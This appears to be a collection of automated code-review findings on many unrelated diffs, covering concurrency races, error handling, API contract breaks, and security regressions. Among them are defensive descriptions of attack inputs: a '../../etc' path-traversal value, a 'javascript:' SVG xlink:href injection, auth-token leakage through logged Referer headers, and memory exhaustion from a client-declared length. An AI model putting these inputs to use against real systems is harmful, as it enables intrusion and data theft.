Add a test asserting that push_metrics returns None (or the expected value) when _client.send raises, and that it still returns the send result on success.

findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, yields control at line 18 (`await asyncio.sleep(0)`), then writes back `current + cost` at line 19 — all without holding `_lock`, which every other mutation of `_counters` uses (line 9).

Two concrete defects follow:

1. **Limit bypass.** N coroutines can all read the same `current`, all pass the `current + cost > LIMIT` check at line 16, and all return `True`. The effective consumption reaches `current + N*cost`, arbitrarily over `LIMIT`. The `await` on line 18 guarantees a scheduling point between the check and the act, so this is not a rare interleaving — it is the expected one under any concurrency.
2. **Lost update.** Line 19 is a blind assignment of a value computed before the await, not a read-modify-write. Any increment applied by `consume` (line 10) while `try_consume` was suspended is silently overwritten, so `consume`'s atomicity under `_lock` no longer holds anything: charges disappear.

Fix by doing the whole check-and-increment under the same lock, and by incrementing from the freshly-read value rather than the stale local:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` on line 18 stands in for real I/O that must happen mid-operation, the counter needs to be reserved before the await and released on failure, not recomputed after it.

_Also raised by the security agent:_ Rate limit in try_consume is bypassable: check-then-act outside the lock

findings.title: No test exercises try_consume's concurrent race behavior
findings.body: try_consume reads _counters.get(tenant,0), awaits asyncio.sleep(0), then writes without holding _lock — a classic check-then-act race. There is no test in this diff verifying single-caller correctness (limit enforcement, boundary at LIMIT) nor concurrent-caller behavior (two tasks racing past the check). Any regression here — e.g. dropping the limit check or making the race worse — would go undetected.

findings.title: consume() ignores LIMIT, so the two entry points disagree
findings.body:
`LIMIT` is introduced at line 5 but only consulted by `try_consume`. The pre-existing `consume` (lines 8-11) still increments unconditionally and returns the new total. If both functions are reachable for the same tenant, `consume` can push a counter past `LIMIT`, after which `try_consume` returns `False` for that tenant permanently (nothing in this file ever decrements or resets `_counters`).

Either route `consume` through the same limit check, or document that it is an explicitly unmetered path. I do not have the callers of `consume` in the retrieved context, so I cannot tell whether both are live — if `try_consume` is intended to replace `consume`, the old function should go rather than linger with different semantics.

findings.title: No validation that cost is non-negative before it adjusts the quota counter
findings.body:
`try_consume` accepts `cost` and applies it directly to the tenant's counter. A zero or negative `cost` passes the check at line 16 unconditionally and, at line 19, writes a counter value lower than the current one — refunding or zeroing the tenant's accumulated usage. If `cost` is derived from a request (e.g. a declared payload size, item count or weight), a caller can reset its own quota and then consume without limit.

Suggest rejecting or clamping non-positive `cost` at the top of the function, and asserting the same invariant in `consume`.

I cannot see where `cost` originates — no caller or handler appears in this diff or in the retrieved context — so this is only exploitable if the value is caller-influenced rather than a server-side constant.

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body:
`lookup_user` now returns a dict with three keys instead of a `(name, email)` tuple. The retrieved caller `reports/weekly.py:6` does `name, email = lookup_user(user_id)`. Unpacking a dict iterates its keys, so this now raises `ValueError: too many values to unpack (expected 2)` on every call — and even if the dict had exactly two keys it would bind the strings `"name"`/`"email"` rather than the values, silently producing wrong output.

Either update all callers (`render_row` becomes `user = lookup_user(...); f"{user['name']} <{user['email']}>"`) in the same change, or keep `lookup_user` returning the tuple and add a new function (e.g. `lookup_user_details`) for the richer shape.

findings.title: Docstring describes old return type, not new dict
findings.body:
The docstring states 'Return (name, email) for a user.' but the function now returns a dict with keys 'name', 'email', and 'tier'. This is misleading to callers. The docstring must be updated to reflect the new return shape: something like 'Return {"name": str, "email": str, "tier": str} for a user.' or similar. Note: the existing caller in reports/weekly.py will break when it attempts to unpack this dict as a tuple.

_Also raised by the correctness agent:_ Docstring still documents the old tuple return shape

findings.body: lookup_user now returns a dict instead of a (name, email) tuple, but there is no test verifying its return shape or exercising callers like reports/weekly.render_row, which still does `name, email = lookup_user(user_id)`. That unpacking will raise a ValueError at runtime (too many values to unpack), but nothing in the diff or visible repo tests would catch this before it ships.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body:
The `err` bound by `if _, err := db.Exec(...); err != nil` is scoped to the `if` statement, so it goes out of scope at line 17. Line 18 then declares a fresh `var err error` that is never assigned, and line 19 returns that zero value — `nil`. Every caller of `WriteSettlement` will see success even when the INSERT failed, so a settlement can be silently lost with nothing but a log line. This also diverges from the sibling `WriteEntry` (line 7-8), which propagates the `db.Exec` error to the caller.

Fix by returning the error directly:

```go
if _, err := db.Exec(...); err != nil {
	log.Printf("settlement insert failed: %v", err)
	return err
}
return nil
```

findings.title: WriteSettlement's error-swallowing path is untested
findings.body: WriteSettlement declares a fresh `var err error` at line 18 that shadows the err from the db.Exec check, so the function always returns nil regardless of whether the insert succeeded. No test exercises this function, so this always-nil-return bug would pass silently through any test suite. Add a test that forces db.Exec to fail (e.g. via a mock/fake DB) and asserts WriteSettlement returns a non-nil error.

findings.title: Mutable default `attempted=[]` accumulates state across calls
findings.body:
The default value `[]` is evaluated once at function definition time, so every call to `send_with_retries(recipients)` that omits `attempted` shares the same list object. Line 10 appends to it and line 11 returns it, so the second call returns the failures from the first call as well, and the list grows without bound for the lifetime of the process. Callers that treat the return value as "recipients that failed in this batch" will get wrong results and may re-dispatch to recipients that already succeeded.

Fix with the same idiom already used on line 2:

    def send_with_retries(recipients, attempted=None):
        attempted = list(attempted or [])
        ...

(or `if attempted is None: attempted = []` if the caller is intended to pass a list to be mutated in place).

_Also raised by the security agent:_ Shared default list leaks recipients across calls and grows unbounded

findings.title: New send_with_retries function has no tests covering repeated calls
findings.body: send_with_retries uses a mutable default argument (attempted=[]) which will persist and accumulate across multiple calls that don't pass an explicit list. No test exists that calls this function twice without supplying `attempted`, so a test would not catch the leaking state bug or verify correct per-call behaviour.

findings.title: compute_rounding comparison flipped: >= 0.5 became > 0.5
findings.body: The old `calc_rounding` rounded half up (`line.remainder_cents >= 0.5` -> 1). The new `compute_rounding` uses `> 0.5`, so a remainder of exactly 0.5 now rounds down to 0 instead of up to 1. Exactly-half remainders are not a rare edge case in cents arithmetic — any amount ending in a half cent (e.g. a 50%-split or a 0.5% rate on an even amount) hits it, and every such line item is now understated by one cent. Nothing else in this PR is a behaviour change, so this looks like an accidental edit during the rename. Restore `>=` unless the rounding policy was deliberately changed, in which case it needs its own PR and a test.

findings.title: Behavior-changing comparison flip in compute_rounding is untested
findings.body: The rename PR silently changed the rounding boundary from `>= 0.5` to `> 0.5`. This changes the return value for line.remainder_cents == 0.5 (was 1, now 0). No test file is included in this diff, so if this comparison is wrong (i.e., it was meant to be a pure rename), nothing would fail. Add a test asserting compute_rounding(0.5) == 1 (or whatever the intended boundary behavior is) to catch this class of regression.

findings.title: Off-by-one slice drops the last record of every page
findings.body: `page_of_sorted` computes `start = page * PAGE_SIZE` but slices to `start + PAGE_SIZE - 1`, so each page returns only PAGE_SIZE-1 items. Because `start` still advances by a full PAGE_SIZE per page, the record at index `start + PAGE_SIZE - 1` is never returned on any page — it is dropped from the export entirely rather than shifted to the next page. Compare the existing `page_of` on line 6, which correctly slices `records[start : start + PAGE_SIZE]`. Change the end bound to `start + PAGE_SIZE`.

A test asserting the length and contents of a returned page (e.g. page size == PAGE_SIZE for a full page) would have caught this.

findings.title: Removed None guard: .upper() on optional purchase_order raises AttributeError
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as set for only about one account in twenty. The previous code guarded with `if invoice.purchase_order is not None:` before calling `.upper()`. The new unconditional `f"PO {invoice.purchase_order.upper()}"` will raise `AttributeError: 'NoneType' object has no attribute 'upper'` for the overwhelming majority of invoices, breaking rendering entirely. findings.title: File handle leaks when the header check fails
findings.body:
`fh = open(path)` is only closed on the success path (line 16). When `header != expected_header` the function returns at line 14 with the handle still open, so the descriptor is only reclaimed whenever GC happens to run (and never, deterministically, on PyPy or if the object is referenced by a traceback). A loop that validates many files will exhaust the fd limit. Rewrite using the same `with open(path) as fh:` pattern already used by `read_rows` on line 5, so every exit path closes the handle.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any transient failure that occurs *after* the gateway has accepted the POST (timeout on the response, connection reset, 5xx from a proxy in front of a succeeded write) will be retried and will create a second and third charge against the customer's card. This is a money-losing, customer-visible defect, not a theoretical one.

The gateway docstring also states the fix: "The gateway supports an Idempotency-Key header; pass one to make retries safe." Generate a stable key per logical charge attempt (e.g. a caller-supplied request/order id, not a fresh UUID per attempt), thread it through `charge()`, and only then retry. Until that key is plumbed through, remove the `@retry` from `charge_card` and let the failure surface to the caller. Note the contrast with `fetch_charge` above, which retries a documented-safe GET \u2014 that one is correct.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: Undocumented retry on non-idempotent operation
findings.body: The `charge_card` function applies a retry decorator to the `charge` operation, which the underlying gateway docstring explicitly states is NOT idempotent: "each call creates a new charge." A caller using this function may believe retries are safe when they are not. The function must document that retries require an Idempotency-Key to be safe, or document what happens on failure (whether retries are attempted and whether duplicate charges may result).

findings.title: No test covers retry behavior on non-idempotent charge_card
findings.body: charge_card wraps billing.gateway.charge, which its own docstring states is NOT idempotent — each call creates a new charge unless an Idempotency-Key is passed. Applying @retry(attempts=3) to it means a transient failure (e.g. timeout after the charge succeeded server-side) would cause up to 3 real charges. There is no test in this diff verifying that retries either pass an idempotency key or are safe to repeat; a test that mocks charge() and asserts only call_count without checking for duplicate-charge protection would not catch this, and no such test exists at all here.

The function `contactEmail` is exported and public, but has no docstring or comments explaining its behaviour. findings.title: Lowered default retries breaks sync_partner_catalogue (INC-4471)
findings.body:
`fetch()`'s default `retries` drops from 5 to 1. `sync/nightly.py:sync_partner_catalogue()` calls `fetch(url)` with no `retries` argument and its docstring states the reliance on the default is deliberate and was the fix for INC-4471, against a partner API that returns 503 roughly one call in three during the nightly window.

With the old default the chance of exhausting attempts is roughly (1/3)^5 ≈ 0.4%; with `retries=1` it becomes roughly (1/3)^2 ≈ 11% per nightly run — a regression of the incident fix.

Either keep the default at 5, or make the reliance explicit at the call site by passing `fetch("https://partner.example.com/catalogue", retries=5)` in `sync/nightly.py` as part of this change (and update the docstring accordingly). Any other call sites relying on the implicit default should get the same treatment.

findings.title: No test guards fetch()'s default retries against regression
findings.body: The default retries value changed from 5 to 1. sync_partner_catalogue() explicitly depends on this default to survive a known flaky dependency (per its docstring, tied to INC-4471), but nothing in the repo appears to test fetch()'s default behavior or sync_partner_catalogue's resilience to transient 503s. If this default is wrong (as it is here), no test fails — the regression would only surface in production during the partner's flaky window.

findings.title: Duplicate index: invoices (tenant_id, created_at DESC) already exists
findings.body: `invoices_tenant_created_idx2` indexes `invoices (tenant_id, created_at DESC)` — byte-for-byte the same table, column list and sort order as `invoices_tenant_created_idx`, created in migration 0007 (applied 2025-11-02). Because the name differs, Postgres will happily create it rather than erroring, so this ships silently: a second B-tree over the same key that the planner will never prefer over the first, plus permanent extra write amplification on every INSERT/UPDATE of `invoices` and extra storage and VACUUM work. Drop lines 7-8; the existing index already serves this query. If the reporting query needs something the old index lacks (e.g. an INCLUDE column or a partial predicate), make that explicit here and drop the 0007 index in the same migration instead of keeping both.

findings.title: Auth token in Referer header is logged verbatim after scrubbing removed
findings.body:
The previous code passed the `Referer` header through `_scrub_uri(value, extra_param_keys)` before adding it to the logged headers dict; the new code writes `request.headers[header]` straight into `headers` for every header including `Referer`, and line 6 serialises that dict into the log.

Per the retrieved `token_authenticated_url` helper, Jupyter hands out notebook URLs of the form `{base}?token={token}`, and browsers send that full URL — token included — as the `Referer` on every subresource request. The result is that a valid session token is written in cleartext to the server log on each 5xx. Anyone who can read logs (operators, log shippers, aggregation services, crash/bug-report bundles) obtains a credential that authenticates as the user.

Restore the scrub: keep the `if header == "Referer": value = _scrub_uri(value, extra_param_keys)` branch before storing the value. If the goal was more diagnostic detail on 5xx, log the scrubbed URI plus a redaction marker rather than the raw header.

_Also raised by the correctness agent:_ Referer logged unscrubbed, leaking the auth token into logs

findings.title: No test guards against Referer token leakage in logs
findings.body: The diff removes the scrubbing of the Referer header before logging, reintroducing a token-leak vector (per the docstring in identity.py, token_authenticated_url embeds the auth token in the URL, which browsers echo back in Referer). There is no test in this PR asserting that a Referer containing a token/query string is scrubbed before being written to the log. If such a test existed and were passing before this change, it should have failed here — its absence means this regression can land silently and nothing will catch a future reintroduction either.

findings.title: xlinkhref no longer validated, reopening javascript: URL injection
findings.body:
`validateProp` previously routed `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` no longer matches the condition on line 6 and therefore skips `isAnchorLinkAllowed` entirely, falling through to the function's default outcome for unrecognised attributes. Since `<svg><a xlink:href="javascript:...">` executes in browsers that still honour the legacy attribute, markdown authored by an end user can inject script. Restore `|| attribute === 'xlinkhref'` in the condition (and keep any normalisation that maps `xlink:href` to `xlinkhref` intact).

_Also raised by the security agent:_ xlink:href no longer scheme-checked, re-enabling SVG XSS

findings.title: No test guards against xlinkhref bypassing sanitisation
findings.body: The condition that previously validated the `xlinkhref` attribute (guarding against SVG xlink:href XSS) has been removed, and no test in this diff exercises an attribute named `xlinkhref` to confirm it is still sanitised. If this change were wrong, any existing test suite would still pass since nothing asserts that `validateProp('xlinkhref', 'javascript:...')` returns false.

findings.title: Project query param reaches buildPath with validation removed
findings.body:
`projectQueryParameter` comes straight from the request query string and, once this block no longer calls `common.ValidateID`, the only remaining check is the equality comparison against `parameters.Project` on line 4 — which is skipped entirely when the path parameter is empty. The value then flows into the file DAO, whose `buildPath` explicitly documents "It does no validation of its own: callers are required to have validated the names before this point" and passes the name to `filepath.Join(d.Folder, project, kind)`. A value such as `../../etc` therefore escapes the storage root, allowing reads outside the intended project directory. Restore the `common.ValidateID(projectQueryParameter)` check (returning `HandleBadRequestError`) before the value is used, or move an equivalent check into `buildPath` so the precondition cannot be dropped by a caller again.

_Also raised by the security agent:_ Path traversal: project query param no longer validated before filesystem use

findings.title: Removed validation breaks documented contract of buildPath
findings.body: The buildPath function in file.go explicitly documents that "callers are required to have validated the names before this point." This diff removes the ValidateID call on the projectQueryParameter, which is then passed through to buildPath via parameters that eventually reach filesystem operations. The removal contradicts the documented precondition that buildPath's callers must enforce.

findings.title: No test catches removal of project ID validation
findings.body: The removed call to common.ValidateID(projectQueryParameter) previously rejected malformed project names (e.g. containing '../') before they reach buildPath, which joins them directly into a filesystem path. No test in this diff exercises the list() function with an invalid/malicious projectQueryParameter, so this regression would pass CI silently. A test asserting that list() returns a bad-request error for a project query param containing path traversal characters (or otherwise failing common.ValidateID) would have caught this change.

findings.title: Buffer pre-allocated from client-declared Content-Length (OOM)
findings.body:
`multipart.NewRW().Reserve(contentLength)` commits memory up front based on `contentLength`, which for an S3 `UploadPart` request is derived from the client's `Content-Length` header — it is not a measurement of bytes actually received. A client can declare a multi-gigabyte part and then send a few bytes (or nothing) and disconnect; the allocation happens before `io.Copy` on line 8 reads anything, so the cost is paid regardless. Repeating this concurrently exhausts server memory and kills the process for all tenants. The previous code grew the RW a page at a time as the body was read, so memory tracked bytes actually delivered.

Either revert to the incremental-growth `NewRW()`, or clamp the reservation to a hard maximum (and to the configured max part size) and treat any declared length above it as a `400`/`EntityTooLarge` rather than an allocation.

_Also raised by the correctness agent:_ Buffer sized from unvalidated client-declared contentLength

findings.title: No test guards against unbounded allocation from declared length
findings.body: The change makes buffer allocation depend on a client-supplied contentLength before any bytes are read (`multipart.NewRW().Reserve(contentLength)`). If contentLength is attacker-controlled and huge, this pre-allocates memory regardless of actual body size — a classic resource-exhaustion regression. Nothing in this diff (no test file included) verifies that upload part handling rejects or caps reservation based on an oversized or mismatched declared length. A test that uploads a part with a very large declared contentLength but a small actual body, and asserts the server does not allocate/blow up or that the actual bytes copied are validated against the claim, would have caught this being inverted from the intended fix.

findings.title: Negative/unknown contentLength is passed to Reserve unguarded
findings.body: Go reports an unknown body length as `-1` (and chunked/streaming S3 uploads commonly produce that, or `0`). `Reserve` is being handed that value directly. If it forwards the argument to `make([]byte, 0, n)` or similar, a negative capacity panics at runtime; if it silently no-ops, the call is merely useless. Guard the call site — only reserve when `contentLength > 0` (and below a sane cap) — rather than relying on unverified defensive behaviour inside `Reserve`.

findings.title: Comment no longer describes buffer growth behavior
findings.body: The comment previously explained that 'The RW grows a page at a time as the body is read.' This describes the old lazy-growth behavior. The code now pre-reserves space based on contentLength, changing the allocation strategy. The comment should be updated to reflect that the buffer is now pre-allocated from a client-declared length.

findings.title: S3 scheme now defaults to plaintext HTTP when is_secure is absent
findings.body:
The previous expression `"http" if request.meta.get("is_secure") is False else "https"` only downgraded to HTTP on an explicit `is_secure=False`; every other case — including the common case where `is_secure` is not set at all and `.get()` returns `None` — produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats every falsy value, and therefore the missing-key `None`, as a request for plaintext. Any caller that does not explicitly set `request.meta["is_secure"] = True` will now have its signed S3 request, including the AWS `Authorization` header / query signature, sent unencrypted over the network and reachable by any on-path observer. Restore the explicit-`False` check (or equivalently default the lookup: `request.meta.get("is_secure", True)`) so that absence of the flag keeps meaning HTTPS.

_Also raised by the security agent:_ S3 requests default to plaintext HTTP, exposing signed AWS credentials

findings.title: No test covers default scheme selection for S3 requests
findings.body: The scheme-selection logic was inverted so that when `request.meta.get("is_secure")` is absent or falsy, the request now defaults to `http` instead of `https`. No test in this diff exercises `download_request` with `is_secure` unset, true, or false to verify which scheme is chosen. Without such a test, this default-to-plaintext behavior (or any future change to it) would go unnoticed.

findings.title: DELETE now requests "push" access, dropping the distinct delete action
findings.body:
The previous switch mapped `http.MethodDelete` to the `delete` action; the collapsed condition treats every non-GET/HEAD method — including DELETE — as `push`. Two consequences, both wrong:

1. An account holding only `push` now passes authorization for DELETE requests, i.e. it can remove existing tags. `pkg/api/config/config.go` states the actions are distinct on purpose precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones." This is the exact scenario the earlier fix addressed.
2. `ActionDelete` becomes unreachable from this code path, so any policy that grants `delete` without `push` will now deny legitimate deletions.

Restore an explicit `case http.MethodDelete: action = "delete"` (or an equivalent branch) so DELETE maps to the delete action.

_Also raised by the security agent:_ DELETE now authorized as "push", bypassing the delete permission

_Also raised by the docs agent:_ DELETE requests now silently map to push action

findings.title: No test guards DELETE-to-action mapping regression
findings.body: The change collapses the method switch so that DELETE requests now resolve to action "push" instead of "delete". This is exactly the kind of authorization-mapping regression that a table-driven test over request.Method -> action would catch, but no test file is included in this diff. If any existing test asserts the old mapping (DELETE -> delete), it should have failed here; if none exists, this behavior change is currently unguarded.

findings.title: Unknown methods (OPTIONS, TRACE, ...) now default to "push" instead of "pull"
findings.body: The old switch had an explicit `default: action = "pull"`, so any method outside the enumerated set requested the least-privileged access. The new negated condition lumps every unenumerated method (OPTIONS, TRACE, CONNECT, or any custom verb reaching this handler) into `push`. If the intent is to keep the safe default, the condition should enumerate the write methods positively (`POST`, `PATCH`, `PUT`, and `DELETE` handled separately) rather than negating the read methods.

findings.title: get_tenant_fresh() name misleads: mutates cache despite get_* prefix
findings.body: The function `get_tenant_fresh()` uses the `get_*` naming convention, which conventionally signals a read-only lookup operation. However, this function mutates the cache (lines 10, 12: `_CACHE[tenant_id] = tenant` and `_CACHE.clear()`). A caller following the established pattern from `get_tenant()` on line 4 would reasonably expect `get_tenant_fresh()` to be safe to call without side effects, leading to incorrect usage. Rename to `fetch_tenant_fresh()` or `refresh_tenant()` to signal mutation.

findings.title: Size-bound clear() discards the entry just written
findings.body: After storing `tenant` at line 10, the size check at line 11 clears the entire cache when it exceeds 1000 entries — including the entry that was just inserted. So on every 1000th fresh lookup, a caller that does `get_tenant_fresh(x)` followed by `get_tenant(x)` gets `None` back from the second call, and every other warmed tenant is evicted at the same time, producing a periodic cache-miss storm. If a bound is wanted, evict a single victim (or use an LRU/`OrderedDict.popitem`) rather than flushing, and check the bound before inserting so the new entry survives.

findings.title: No test for get_tenant_fresh's cache write/eviction logic
findings.body: get_tenant_fresh writes to _CACHE and clears it once it exceeds 1000 entries. If _fetch's return value were not stored, or if the eviction threshold/logic were wrong (e.g. off-by-one, wrong clear condition), nothing in this diff would catch it since no test file is included.

findings.title: Attacker-chosen tenant_id can force a full cache flush
findings.body: `get_tenant_fresh` inserts `tenant` under the caller-supplied `tenant_id` (line 10) and, once the map exceeds 1000 entries, discards the entire cache (lines 11-12) rather than evicting a single entry. If `tenant_id` can be influenced by a remote caller, requesting ~1000 distinct (even nonexistent) ids repeatedly flushes every warm entry, so every subsequent `get_tenant` miss falls through to `_fetch` — a cheap amplification against whatever backend `_fetch` talks to. Two mitigations: validate/authorise `tenant_id` before it becomes a cache key (do not cache a `_fetch` result for an id the caller has no right to), and evict a bounded number of entries (LRU or single-key) instead of `clear()`.

findings.title: README documents renamed flag by old name
findings.body:
The README at line 7 documents the flag as `--workers`, but cli.py line 6 has renamed it to `--concurrency`. Users following the README will use an invalid flag name. Update the documentation to match the new flag name.

_Also raised by the correctness agent:_ README still documents the removed `--workers` flag

findings.title: Flag rename breaks `args.workers` consumers and existing invocations
findings.body: Renaming `--workers` to `--concurrency` changes two contracts at once: argparse will now populate `args.concurrency` instead of `args.workers`, so any code reading `args.workers` raises `AttributeError` at runtime, and any existing script, Makefile, systemd unit or CI job passing `--workers` now fails with `error: unrecognized arguments`. If this rename is intended, either update every consumer of `args.workers` or keep backwards compatibility, e.g. `p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)` so the old spelling keeps working during a deprecation window. No callers were retrieved, so the blast radius could not be confirmed from the context provided.

findings.title: No test asserts the renamed --concurrency flag is parsed
findings.body: The flag was renamed from --workers to --concurrency but no test exercises parser() to confirm --concurrency is accepted and --workers is gone. If the rename were reverted or misspelled, nothing would fail.

findings.title: Docstring describes old return type, not dict
findings.body: The docstring states the function returns 'the total number of API calls this month as an integer', but the new implementation returns a dictionary mapping days to counts. A caller reading only the docstring would expect an integer and attempt to use the result as a number, which would fail. Update the docstring to describe the new return type and structure.

findings.title: Return shape changed from int to dict; docstring and callers still assume int
findings.body:
`monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. Any existing caller doing arithmetic or comparison on the result (`monthly_usage(a) > limit`, `total + monthly_usage(a)`, formatting it into a message) will now silently operate on a dict — comparisons raise `TypeError`, and truthiness/formatting changes meaning. The docstring on line 2 still states "Return the total number of API calls this month as an integer", so nothing signals the break to readers.

Either keep the scalar contract and expose the per-day breakdown under a new function/parameter, or update every caller plus the docstring in this change.

findings.title: No test covers the new dict-by-day return shape
findings.body: monthly_usage now returns a dict mapping day to count instead of a single integer total, but no test file is present in this diff. If the query grouping, key naming (row["day"]), or aggregation logic were wrong, nothing would fail. Add a test that calls monthly_usage against a fixture/mock DB returning multiple day rows and asserts the resulting dict has the expected day->count mapping.

findings.title: Docstring parameter name does not match signature
findings.body: The docstring documents the parameter as `page_size`, but the function signature on line 1 now names it `limit`. A caller reading the docstring would use the wrong parameter name when calling the function. Update the docstring to reflect the new parameter name.

findings.title: Renaming keyword parameter page_size -> limit breaks keyword callers
findings.body: `list_invoices` is a module-level function whose second parameter changed name from `page_size` to `limit`. Positional callers are unaffected, but any caller using `list_invoices(tenant_id, page_size=100)` — the usual style for optional pagination args — now raises `TypeError: unexpected keyword argument 'page_size'`, at runtime rather than at import. No callers were retrieved with this change, so the blast radius is unverified. Please either (a) grep for `page_size=` at call sites and update them in the same commit, or (b) keep backwards compatibility for a release, e.g. `def list_invoices(tenant_id, limit=50, cursor=None, page_size=None)` mapping the deprecated name onto `limit` with a warning. The stale docstring on line 6 is a signal that the rename was not traced through its dependents.

findings.title: verify/cert silently dropped in new request() path
findings.body:
The new `request()` keeps `verify` and `cert` in its signature (lines 148-149) but the body (lines 151-167) only copies method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies and hooks onto `req` before calling `req.prepare()` and `self.send(prep)`. `verify` and `cert` are never read again, and `send()` (lines 364-367) constructs a bare `HTTPAdapter()` with no configuration, so nothing downstream can recover them.

Consequences: a caller that passes `verify='/path/to/ca-bundle.pem'` (custom/pinned CA) gets the adapter's default trust store instead, and a caller that passes `cert=(...)` for mutual-TLS gets an unauthenticated connection — both fail open and silently. Whether plain `verify=True` still holds depends on the unseen `adapters.HTTPAdapter` default, which is why this is worth confirming rather than assuming.

Same hunk: `timeout` (line 141) and `prefetch` (line 147) are likewise accepted and discarded, so requests to a slow or malicious host can hang indefinitely. Thread these parameters through `req`/`prepare()` or onto the adapter before this path replaces `old_request`.

findings.title: `_send_request` deleted but still called by `old_request`
findings.body: The diff removes the `_send_request` method definition, yet `old_request` still ends with `return self._send_request(r, **args)` on line 292. Any call into `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep the method while `old_request` survives the refactor, or delete `old_request` too.

findings.title: New `request()` accepts but silently ignores timeout/verify/cert/prefetch/return_response
findings.body: The new `request()` keeps the full public signature but only forwards `method`, `url`, `headers`, `files`, `data`, `params`, `auth`, `cookies`, `allow_redirects`, `proxies` and `hooks`. `timeout`, `return_response`, `config`, `prefetch`, `verify` and `cert` are never read: `self.send(prep)` takes no such arguments. Existing callers that pass `timeout=` will now hang indefinitely instead of timing out, and `verify=False` / `cert=...` will be silently ignored, which turns a disabled-TLS-verification request into a verified one (or vice versa) with no error. Either thread these through to `send`/the adapter or remove them from the signature so callers fail loudly.

findings.title: `from adapters import HTTPAdapter` is not a package-relative import
findings.body: Every other intra-package import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...`). `from adapters import HTTPAdapter` resolves against `sys.path`, not the `requests` package, so on Python 3 (or Python 2 with `absolute_import`) importing `requests.sessions` raises `ImportError` and the entire library fails to load. Change it to `from .adapters import HTTPAdapter`.

findings.title: Connection pooling and teardown both removed: adapter rebuilt per send, close() is a no-op
findings.body: `init_poolmanager()` and its call in `__init__` are gone, so `self.poolmanager` no longer exists — any caller or test touching `session.poolmanager` now raises `AttributeError`. `close()` has been reduced to `pass`, so `with Session() as s:` and explicit `close()` no longer release pooled sockets. Compounding this, `send()` constructs a fresh `HTTPAdapter()` on every call (line 365), so each request gets a brand-new pool manager and no connection reuse at all, and none of those pools are ever cleared. The adapter should be created once (in `__init__`) and `close()` should dispose of it.

findings.title: New adapter-based send() path has no test coverage
findings.body: Session.send() and the new Session.request() method (which builds a Request/PreparedRequest and calls self.send()) are a substantial behavioral rewrite of how requests are dispatched, replacing request.send() with HTTPAdapter().send(request). No test in this diff exercises request()/send() to confirm a request is actually built, prepared, and dispatched correctly through the adapter. Likewise, close() was changed from closing the poolmanager to a bare `pass` (line 132), silently dropping connection cleanup — nothing would fail if this regressed further or the adapter path broke entirely.

findings.title: Unqualified `from adapters import ...` is resolvable from sys.path[0]
findings.body: Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...`), but this one is an absolute top-level import of a very generic module name. On Python 3 (and on Python 2 with `absolute_import`) this does not resolve to `requests.adapters` at all — it resolves against `sys.path`, whose first entry is the invoking script's directory or the CWD. Any `adapters.py` sitting there is imported instead, and it then supplies the object that performs every outbound request for the library, including whatever TLS behaviour it chooses. Change it to `from .adapters import HTTPAdapter`.

findings.title: Removed docstring from close() without explaining new behavior
findings.body: The `close()` method previously documented that it disposed of internal state by closing the PoolManager and pooled connections. The method now just passes, but its original docstring has been removed without being replaced. A caller reading the old documentation would expect connection cleanup to happen, but it no longer does.

findings.title: send() docstring does not document new HTTPAdapter usage
findings.body: The `send()` method's docstring says 'Send a given PreparedRequest' but does not document that it now creates and uses an HTTPAdapter internally, or what happens if adapter initialization fails. The implementation has changed substantially from `request.send()` to adapter-based sending, but the docstring was not updated.

findings.title: cookies property returns None on parse failure, breaking callers
findings.body:
When `Cookie.SimpleCookie.load()` raises (a malformed or attacker-supplied `Cookie` header is enough), the new property assigns `self._cookies = None` and returns it. Every caller treats the result as a mapping:

- `web.py:321` does `if name in self.request.cookies:` 	a `None` value raises `TypeError: argument of type 'NoneType' is not iterable`.
- `web.py:367` does `self.request.cookies.iterkeys()` 	raises `AttributeError: 'NoneType' object has no attribute 'iterkeys'`.

Because `_cookies` is now set, the `hasattr` guard on line 516 short-circuits on every subsequent access, so the whole request is poisoned 	any handler calling `get_cookie` (including `get_secure_cookie` and XSRF handling) will 500 on a bad cookie header instead of degrading to "no cookies".

The old web.py version handled this by calling `self.clear_all_cookies()`, leaving `self._cookies` as an empty `SimpleCookie`. Since `clear_all_cookies` is a response-side operation that doesn't belong on `HTTPRequest`, the correct replacement is to reset to an empty container, e.g. `self._cookies = {}` (or a fresh `Cookie.SimpleCookie()`), not `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies return None, crashing callers

findings.title: No test covers cookie-load-failure behavior change
findings.body: The moved cookies property changes error handling on a malformed Cookie header: the original web.py version called self.clear_all_cookies() on parse failure, while the new httpserver.py version simply sets self._cookies = None. This changes what callers (e.g. RequestHandler.get_cookie/clear_all_cookies) see when the header fails to parse — they would now get None instead of an empty/cleared SimpleCookie, which can raise AttributeError downstream. Nothing in this diff exercises the malformed-cookie path, so this behavioral change (and its interaction with the callers in web.py) would pass silently even if it breaks callers.

findings.title: Incomplete docstring for cookies property return type
findings.body: The docstring states the property returns "A dictionary of Cookie.Morsel objects," but the implementation can return `None` on line 523 if cookie parsing fails. Callers will get an incorrect expectation about the possible return values. Update the docstring to document that `None` may be returned when cookie parsing fails.

findings.title: Boundary parameter never matches: field not stripped after split(";")
